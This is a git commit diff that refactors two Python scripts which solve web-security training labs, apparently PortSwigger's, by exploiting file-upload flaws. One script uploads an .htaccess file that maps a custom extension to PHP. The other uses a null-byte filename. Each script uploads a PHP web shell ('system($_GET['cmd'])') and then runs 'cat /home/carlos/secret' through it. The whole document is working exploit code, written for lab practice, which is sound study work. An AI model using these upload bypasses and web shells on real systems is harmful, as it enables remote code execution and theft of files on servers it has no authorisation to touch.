2c6b199d3d5cf1695d4db2c1789b70b16e2338a7
Iman Ali <imanali194@gmail.com>
2024-10-19 18:14:09 -0700

    Improve exception and error handling

--- File-Upload/Web shell upload via extension blacklist bypass/script.py
+++ File-Upload/Web shell upload via extension blacklist bypass/script.py
@@ -1,7 +1,7 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
-
+from requests.adapters import HTTPAdapter, Retry
 
 
 def extract_csrf_token(response):
@@ -9,72 +9,82 @@ def extract_csrf_token(response):
     csrf_token = soup.find("input", {"name": "csrf"})["value"]
     return csrf_token
 
+def login(url, session):
+    response = session.get(f"{url}/login", timeout=10)
+    csrf_token = extract_csrf_token(response)
 
-def get_cookie(url):
-    try:
-        response = requests.get(f"{url}/login")
-        csrf_token = extract_csrf_token(response)
+    login_data = {
+        "csrf": csrf_token,
+        "username": "wiener",
+        "password": "peter"
+    }
 
-        login_data = {
-            "csrf": csrf_token,
-            "username": "wiener",
-            "password": "peter"
-        }
-
-        login_response = requests.post(f"{url}/login", cookies={"session": response.cookies.values()[0]}, data=login_data, allow_redirects=False)
-        cookie = login_response.cookies.values()[0]
-        return cookie
-
-    except IndexError:
-        print("Cookie not found in the response, check your url and try again.")
-        sys.exit(1)
-
-    except requests.exceptions.RequestException as e:
-        print(f"An error has occurred: {e}")
-        sys.exit(1)
+    login_response = session.post(f"{url}/login", data=login_data, timeout=10)
+    return login_response.status_code == 200
 
 
-def upload_files(url, cookie):
-   response = requests.get(f"{url}/my-account", cookies={"session": cookie})
-   csrf_token = extract_csrf_token(response)
+def upload_file(url, session):
+    response = session.get(f"{url}/my-account")
+    csrf_token = extract_csrf_token(response)
 
-   htaccess_file = {
+    htaccess_file = {
         "avatar": (".htaccess", "AddType application/x-httpd-php .l33t", "text/plain"),
     }
 
-   web_shell_file = {
+    web_shell_file = {
         "avatar": ("webshell.l33t", "<?php system($_GET['cmd']); ?>", "application/x-php"),
     }
 
-   data = {
+    data = {
         "user": "wiener",
         "csrf": csrf_token,
     }
 
-   requests.post(f"{url}/my-account/avatar", cookies={"session": cookie}, files=htaccess_file, data=data)
-   requests.post(f"{url}/my-account/avatar", cookies={"session": cookie}, files=web_shell_file, data=data)
+    htaccess_file_upload = session.post(f"{url}/my-account/avatar", files=htaccess_file, data=data)
+    web_shell_upload = session.post(f"{url}/my-account/avatar", files=web_shell_file, data=data)
+    return htaccess_file_upload.status_code == 200 and web_shell_upload.status_code == 200
 
 
-def execute_command(url, cookie):
-    response = requests.get(f"{url}/files/avatars/webshell.l33t?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
-    print(response.text)
+def execute_command(url, session):
+    response = session.get(f"{url}/files/avatars/webshell.l33t?cmd=cat%20/home/carlos/secret", timeout=10)
+    return response.text
 
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {sys.argv[0]} <URL>")
-        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
+        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
+    try:
+        url = sys.argv[1].rstrip("/")
+        session = requests.Session()
+        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
 
-    url = sys.argv[1].rstrip("/")
-    print("Logging in...")
-    cookie = get_cookie(url)
-    print("Uploading webshell...")
-    upload_files(url, cookie)
-    print(f"Web shell can be found here: {url}/files/avatars/webshell.l33t")
-    print("The contents of the /home/carlos/secret file: ", end="")
-    execute_command(url, cookie)
+        print("(+) Logging in...")
+        if not login(url, session):
+            print("Something went wrong. Check your URL and try again.")
+            sys.exit(1)
+
+        print("(+) Uploading webshell...")
+        if upload_file(url, session):
+            print(f"(+) Web shell has been uploaded here: {url}/files/avatars/webshell.l33t")
+            secret_file = execute_command(url, session)
+            print(f"(+) The contents of the /home/carlos/secret file: {secret_file}")
+        else:
+            print("(-) File Upload was unsuccessful.")
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+        sys.exit(1)
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
--- File-Upload/Web shell upload via obfuscated file extension/script.py
+++ File-Upload/Web shell upload via obfuscated file extension/script.py
@@ -1,6 +1,7 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
+from requests.adapters import HTTPAdapter, Retry
 
 
 def extract_csrf_token(response):
@@ -8,34 +9,24 @@ def extract_csrf_token(response):
     csrf_token = soup.find("input", {"name": "csrf"})["value"]
     return csrf_token
 
-
-def get_cookie(url):
-    try:
-        response = requests.get(f"{url}/login")
-        csrf_token = extract_csrf_token(response)
-
-        login_data = {
-            "csrf": csrf_token,
-            "username": "wiener",
-            "password": "peter"
-        }
-
-        login_response = requests.post(f"{url}/login", cookies={"session": response.cookies.values()[0]}, data=login_data, allow_redirects=False)
-        cookie = login_response.cookies.values()[0]
-        return cookie
-
-    except IndexError:
-        print("(-) Cookie not found in the response, check your url and try again.")
-        sys.exit(1)
-
-    except requests.exceptions.RequestException as e:
-        print(f"(-) An error has occurred: {e}")
-        sys.exit(1)
-
-
-def upload_file(url, cookie):
-    response = requests.get(f"{url}/my-account", cookies={"session": cookie})
+def login(url, session):
+    response = session.get(f"{url}/login", timeout=10)
     csrf_token = extract_csrf_token(response)
+
+    login_data = {
+        "csrf": csrf_token,
+        "username": "wiener",
+        "password": "peter"
+    }
+
+    login_response = session.post(f"{url}/login", data=login_data, timeout=10)
+    return login_response.status_code == 200
+
+
+def upload_file(url, session):
+    response = session.get(f"{url}/my-account")
+    csrf_token = extract_csrf_token(response)
+
     file = {
         "avatar": ("webshell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "application/x-php"),
     }
@@ -45,12 +36,14 @@ def upload_file(url, cookie):
         "csrf": csrf_token,
     }
 
-    requests.post(f"{url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)
+    upload_response = session.post(f"{url}/my-account/avatar", files=file, data=data)
+    return upload_response.status_code == 200
 
 
-def execute_command(url, cookie):
-    response = requests.get(f"{url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
-    print(response.text)
+def execute_command(url, session):
+    response = session.get(f"{url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", timeout=10)
+    if response.status_code == 200:
+        return response.text
 
 
 def main():
@@ -59,18 +52,37 @@ def main():
         print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
+    try:
+        url = sys.argv[1].rstrip("/")
+        session = requests.Session()
+        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
 
-    url = sys.argv[1].rstrip("/")
-    print("(+) Logging in...")
-    cookie = get_cookie(url)
-    print("(+) Uploading webshell.php...")
-    upload_file(url, cookie)
-    print(f"(+) Web shell has been uploaded here: {url}/files/avatars/webshell.php")
-    print("(+) The contents of the /home/carlos/secret file: ", end="")
-    execute_command(url, cookie)
+        print("(+) Logging in...")
+        if not login(url, session):
+            print("Something went wrong. Check your URL and try again.")
+            sys.exit(1)
+
+        print("(+) Uploading webshell.php")
+        if upload_file(url, session):
+            print(f"(+) Web shell has been uploaded here: {url}/files/avatars/webshell.php")
+            secret_file = execute_command(url, session)
+            print(f"(+) The contents of the /home/carlos/secret file: {secret_file}")
+        else:
+            print("(-) File Upload was unsuccessful.")
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+        sys.exit(1)
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
     main()
-
 
